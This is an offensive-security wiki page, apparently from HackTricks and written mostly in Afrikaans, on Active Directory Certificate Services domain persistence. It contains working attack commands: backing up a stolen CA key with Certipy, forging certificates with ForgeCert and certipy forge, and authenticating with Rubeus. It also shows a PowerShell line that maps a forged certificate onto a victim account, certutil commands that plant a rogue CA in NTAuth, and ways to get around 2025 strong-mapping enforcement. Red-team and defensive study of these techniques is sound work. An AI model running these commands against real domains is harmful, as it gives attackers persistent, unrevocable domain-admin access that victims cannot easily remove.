# AD CS Domein Persistensie

{{#include ../../../banners/hacktricks-training.md}}

**Dit is 'n samevatting van die domein-persistensie tegnieke gedeel in [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Kyk daarna vir verdere besonderhede.

## Verval van sertifikate met gesteelde CA-sertifikate - DPERSIST1

Hoe kan jy weet dat 'n sertifikaat 'n CA-sertifikaat is?

Dit kan bepaal word dat 'n sertifikaat 'n CA-sertifikaat is as verskeie voorwaardes vervul word:

- Die sertifikaat word op die CA-bediener gestoor, met sy private sleutel beveilig deur die masjien se DPAPI, of deur hardeware soos 'n TPM/HSM as die operasionele stelsel dit ondersteun.
- Beide die Issuer- en Subject-velde van die sertifikaat stem ooreen met die distinguished name van die CA.
- 'n "CA Version" uitbreiding kom slegs in CA-sertifikate voor.
- Die sertifikaat het geen Extended Key Usage (EKU)-velde nie.

Om die private sleutel van hierdie sertifikaat te onttrek, is die `certsrv.msc`-instrument op die CA-bediener die ondersteunde metode via die ingeboude GUI. Nietemin verskil hierdie sertifikaat nie van ander wat in die stelsel gestoor is nie; dus kan metodes soos die [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) toegepas word vir onttrekking.

Die sertifikaat en private sleutel kan ook met Certipy verkry word met die volgende opdrag:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Sodra die CA-sertifikaat en sy private sleutel in `.pfx`-formaat verkry is, kan gereedskap soos [ForgeCert](https://github.com/GhostPack/ForgeCert) gebruik word om geldige sertifikate te genereer:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Die gebruiker wat geteiken word vir sertifikaatvervalsing moet aktief wees en in staat wees om in Active Directory te autentiseer sodat die proses kan slaag. Om 'n sertifikaat vir spesiale rekeninge soos krbtgt te vervals is ondoeltreffend.

Hierdie vervalste sertifikaat sal **geldig** wees tot die gespesifiseerde einddatum en so lank as wat die root CA-sertifikaat geldig is (gewoonlik van 5 tot **10+ jaar**). Dit is ook geldig vir **rekenaars**, so, gekombineer met **S4U2Self**, kan 'n aanvaller **persistence op enige domeinrekenaar handhaaf** vir so lank as wat die CA-sertifikaat geldig is.\
Verder kan die **sertifikate wat met hierdie metode gegenereer word** **nie herroep word nie**, aangesien die CA nie daarvan bewus is nie.

### Werking onder Strong Certificate Mapping Enforcement (2025+)

Sedert 11 Februarie 2025 (na die uitrol van KB5014754), stel domeincontrollers standaard **Full Enforcement** in vir certificate mappings. Prakties beteken dit dat jou vervalste sertifikate óf:

- Bevat 'n stewige binding aan die teikenrekening (byvoorbeeld die SID security extension), of
- Gepaart wees met 'n sterk, eksplisiete mapping op die teikenvoorwerp se `altSecurityIdentities` attribuut.

'n Betroubare benadering vir persistence is om 'n vervalste sertifikaat te skep wat aan die gesteelde Enterprise CA gekoppel is en dan 'n sterk, eksplisiete mapping by die slagoffer principal te voeg:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Aantekeninge
- If you can craft forged certificates that include the SID security extension, those will map implicitly even under Full Enforcement. Otherwise, prefer explicit strong mappings. See [account-persistence](account-persistence.md) for more on explicit mappings.
- Intrekking help verdedigers hier nie: vervalste sertifikate is onbekend aan die CA-databasis en kan dus nie ingetrek word nie.

## Vertroue in Rogue CA-sertifikate - DPERSIST2

Die `NTAuthCertificates`-objek is bedoel om een of meer **CA-sertifikate** te bevat binne sy `cacertificate` attribuut, wat Active Directory (AD) gebruik. Die verifikasieproses deur die **domain controller** behels die kontrole van die `NTAuthCertificates`-objek vir 'n inskrywing wat ooreenstem met die **CA specified** in die Issuer field van die autentiserende **sertifikaat**. Outentisering gaan voort indien 'n ooreenkoms gevind word.

'n Self-signed CA-sertifikaat kan by die `NTAuthCertificates`-objek gevoeg word deur 'n aanvaller, mits hulle beheer oor hierdie AD-objek het. Gewoonlik is dit net lede van die **Enterprise Admin** group, saam met **Domain Admins** of **Administrators** in die **forest root’s domain**, wat toestemming het om hierdie objek te wysig. Hulle kan die `NTAuthCertificates`-objek redigeer met `certutil.exe` met die opdrag `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, of deur die [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool) te gebruik.

Bykomende nuttige opdragte vir hierdie tegniek:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Hierdie vermoë is veral relevant wanneer dit in samewerking met 'n vroeër uiteengesette metode gebruik word wat ForgeCert behels om sertifikate dinamies te genereer.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Kwaadaardige Verkeerde Konfigurasie - DPERSIST3

Geleenthede vir **persistence** deur **security descriptor modifications of AD CS** komponente is volop. Wysigings beskryf in die "[Domain Escalation](domain-escalation.md)" afdeling kan kwaadwillig deur 'n aanvaller met verhewe toegang geïmplementeer word. Dit sluit die toevoeging van "control rights" (bv. WriteOwner/WriteDACL/etc.) by sensitiewe komponente in soos:

- Die **CA-bediener se AD-computer** objek
- Die **CA-bediener se RPC/DCOM-server**
- Enige **afstammeling AD-voorwerp of houer** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (byvoorbeeld, the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, etc.)
- AD-groepe wat standaard of deur die organisasie regte gedelegeer kry om AD CS te beheer (soos die ingeboude Cert Publishers-groep en enige van sy lede)

'n Voorbeeld van 'n kwaadwillige implementering sou behels dat 'n aanvaller met verhewe permissies in die domein die `WriteOwner`-permit by die standaard `User` certificate template voeg, met die aanvaller as die prinsipaal vir die reg. Om dit te eksploiteer, sou die aanvaller eers die eienaarskap van die `User`-template aan homself verander. Daarna sou die `mspki-certificate-name-flag` op die template op `1` gestel word om `ENROLLEE_SUPPLIES_SUBJECT` moontlik te maak, wat 'n gebruiker toelaat om 'n Subject Alternative Name in die versoek te verskaf. Vervolgens kan die aanvaller `enroll` met behulp van die `template`, 'n `domain administrator`-naam as 'n alternatiewe naam kies, en die verkrygde sertifikaat gebruik vir verifikasie as die DA.

Praktiese instellings wat aanvallers kan stel vir langtermyn domain persistence (sien {{#ref}}domain-escalation.md{{#endref}} vir volledige besonderhede en opsporing):

- CA policy flags that allow SAN from requesters (bv. die inskakeling van `EDITF_ATTRIBUTESUBJECTALTNAME2`). Dit hou ESC1-agtige paaie uitbuitbaar.
- Template DACL of instellings wat uitreiking wat vir authentication geskik is toelaat (bv. byvoeging van Client Authentication EKU, inskakeling van `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Beheer oor die `NTAuthCertificates`-voorwerp of die CA-kontainers om rogue issuers aanhoudend te herintroduseer as verdedigers skoonmaak probeer.

> [!TIP]
> In gehardingsomgewings na KB5014754, die koppel van hierdie wankonfigurasies met eksplisiete sterk mappings (`altSecurityIdentities`) verseker dat jou uitgereikte of vervalste sertifikate bruikbaar bly selfs wanneer DCs sterk mapping afdwing.

## References

- Microsoft KB5014754 – Veranderinge aan sertifikaat-gebaseerde verifikasie op Windows domain controllers (afdwingings-tydlyn en sterk mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
{{#include ../../../banners/hacktricks-training.md}}
